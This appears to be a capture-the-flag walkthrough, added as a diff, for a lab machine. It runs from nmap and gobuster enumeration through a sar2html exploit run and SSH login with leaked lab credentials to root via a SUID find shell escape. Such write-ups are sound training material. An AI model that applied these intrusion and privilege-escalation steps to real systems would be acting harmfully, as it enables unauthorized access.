@@ -1,0 +1,94 @@
+10.10.58.56
+nmap -sC -sV -v 10.10.58.56 -p-
+    21/tcp    open  ftp     vsftpd 3.0.3
+    | ftp-syst: 
+    |   STAT: 
+    | FTP server status:
+    |      Connected to ::ffff:10.6.33.29
+    |      Logged in as ftp
+    |      TYPE: ASCII
+    |      No session bandwidth limit
+    |      Session timeout in seconds is 300
+    |      Control connection is plain text
+    |      Data connections will be plain text
+    |      At session startup, client count was 3
+    |      vsFTPd 3.0.3 - secure, fast, stable
+    |_End of status
+    |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+    80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
+    | http-robots.txt: 1 disallowed entry 
+    |_/
+    | http-methods: 
+    10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
+    |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+    |_http-favicon: Unknown favicon MD5: 48EF71773135B9D9D9CFC3EA0DF6664A
+    | http-methods: 
+    |_  Supported Methods: GET HEAD POST OPTIONS
+
+    Discovered open port 21/tcp on 10.10.58.56
+    Discovered open port 80/tcp on 10.10.58.56
+    Discovered open port 55007/tcp on 10.10.58.56
+
+
+
+File extension after anon login
+    ftp 10.10.58.56   
+    ls -lisa
+    .info.txt
+
+    txt
+
+What is on the highest port?
+    55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey: 
+
+What's running on port 10000?
+    MiniServ 1.930 (Webmin httpd)
+    
+    Webmin
+
+Can you exploit the service running on that port? (yay/nay answer)
+    nay
+
+What's CMS can you access?
+    gobuster dir -u http://10.10.58.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+
+    joomla
+
+Keep enumerating, you'll know when you find it.
+    Ok
+
+The interesting file name in the folder?
+    http://10.10.58.56/joomla/_test/
+    sar2html has exploit in searchsploit
+    python3 /usr/share/exploitdb/exploits/php/webapps/49344.py
+    ls -lisa shows log.txt
+
+    log.txt (shows superduperp@$$)
+    
+
+Where was the other users pass stored(no extension, just the name)?
+    cat backup.sh
+    backup
+
+
+user.txt
+    ssh stoner@10.10.58.56 -p 55007 
+    superduperp@$$no1knows
+
+    cat .secret 
+    You made it till here, well done.
+
+
+What did you exploit to get the privileged user?
+    find / -type f -perm -4000 2>/dev/null
+    
+    /usr/bin/find
+    /usr/bin/find . -exec /bin/sh \; -quit
+
+    find
+
+root.txt
+    cat /root/root.txt
+
+    It wasn't that hard, was it?
